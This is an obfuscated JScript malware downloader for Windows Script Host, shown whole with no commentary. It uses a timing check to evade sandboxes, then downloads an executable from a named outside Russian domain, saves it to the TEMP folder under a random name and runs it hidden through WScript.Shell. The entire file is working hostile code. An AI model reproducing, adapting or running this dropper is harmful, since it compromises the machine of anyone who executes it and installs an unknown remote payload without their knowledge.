var _IS = false;
var _IU = "CreateObject";
var _W0 = function _KW() {return WScript[_IU]("WScript"+".Shell");}(), _P0 = 11;
var _D0 = "MSXML2.XMLHTTP";
var _OX = 2123213;
var _DV = 0;
function _ZO(_S0){_W0["Run"](_S0, _DV, _DV);};
function _FZ(){return _D0 + "";};
function _U(_Z0, _E){_DV = _DV * 1; return _Z0 - _E;};
function _SF(){return _IU;};
/*@cc_on
  @if (@_win32 || @_win64)
    _IS = true;
  @end
@*/
if (_IS)
{
var _JG = "";
function _W(){return 22;};
var _Y = 0; var _L = 0;
function _F()
{
var _N = new this["Date"]();
var _V = _N["getUTCMilliseconds"]();
WScript["Sleep"](_W());
var _N = new this["Date"]();
var _CA = _N["getUTCMilliseconds"]();
WScript["Sleep"](_W());
var _N = new this["Date"]();
var _VT = _N["getUTCMilliseconds"]();
var _Y = "_EB";
_Y = _U(_CA, _V);
var _L = "_NJ";
_L = _U(_VT, _CA);
_JG = "open";
return _U(_Y, _L);
}
var _ZC = false;
var _G0 = false;
for (var _U0 = _DV; _U0 < _W() * 1; _U0++){if (_F() != _DV){
_ZC = true; 
_L = "31" + 11 * _Y + _L; 
_G0 = true; 
break;
}}
function _M() {return ((_ZC == true) && (_ZC == _G0)) ? 1 : _DV;};
if (_ZC && _M() && _G0){
function _P() {return _W0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "SMWqDZws4y3JrD.ex" + "e";};
 _IB = _FZ();
 _JZ = WScript[_IU](_IB);
 var _G = 1;
 while (_G){
try {
	if (_G == 1)
	{
		_JZ[_JG]("GET", "http://ru-optovik.ru/j9ssl", false);
		_JZ["send"]();
		_Q = "Sleep";
	}
	WScript[_Q](_W() + 120); 
	if (_JZ["readystate"] < 2 * 2) continue;
	_G = _DV;
	function _J(_S) {var _F0 = (1, 2, 3, 4, 5, _S); return _F0;};
	_CF = WScript[_SF()]("ADODB.Stream");
	_IB = _CF;
	_IB[_JG]();
	_IB["type"] = _J(1);
	_IB["write"](_JZ["ResponseBody"]);
	_CF["position"] = _J(_DV);
	_IB["Save" + "ToFile"](_P(), 2);
	_CF["cl"+"ose"]();
	_D = _P();
	_ZO(_D);
} catch(_Z){};
}
}
}

